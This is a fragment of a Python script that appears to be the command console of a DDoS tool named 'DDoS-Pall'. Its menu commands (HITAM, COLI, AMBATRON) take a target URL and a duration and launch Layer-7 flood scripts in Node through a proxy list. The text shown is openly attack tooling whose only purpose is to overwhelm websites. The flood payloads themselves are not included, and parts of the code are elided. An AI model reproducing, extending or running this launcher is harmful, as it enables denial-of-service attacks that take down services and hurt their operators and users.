...
\033[0m""")
	...
	while True:
		sys.stdout.write(f"\x1b]2;[\] DDoS-Pall :: Online Users: [1] :: Attack Sended: [1/10]\x07")
		sin = input("\033[0;30;46mDDoS@Pall\x1b[1;37m\033[0m:~# \x1b[1;37m\033[0m")
		sinput = sin.split(" ")[0]
		if sinput == "clear":
			os.system ("clear")
			main()
...
#########LAYER-7########  
		...
		elif sinput == "HITAM" or sinput == "HITAM":
			try:
				url = sin.split()[1]
				time = sin.split()[2]
				os.system(f'cd L7 && node HITAM.js {url} {time} 64 10 proxy.txt')
				os.system ("clear")
			except ValueError:
				main()
			except IndexError:
		...
		elif sinput == "COLI" or sinput == "COLI":
			try:
				url = sin.split()[1]
				time = sin.split()[2]
				os.system(f'cd L7 && node Coli.js {url} {time} 64 10 proxy.txt')
				os.system ("clear")
			except ValueError:
				main()
			except IndexError:
		...
		elif sinput == "AMBATRON":
			try:
				url = sin.split()[1]
				time = sin.split()[2]
				os.system(f'cd L7 && node AMBATRON.js {url} {time} 64 10 proxy.txt')
				os.system ("clear")
			except ValueError:
				main()
			except IndexError:
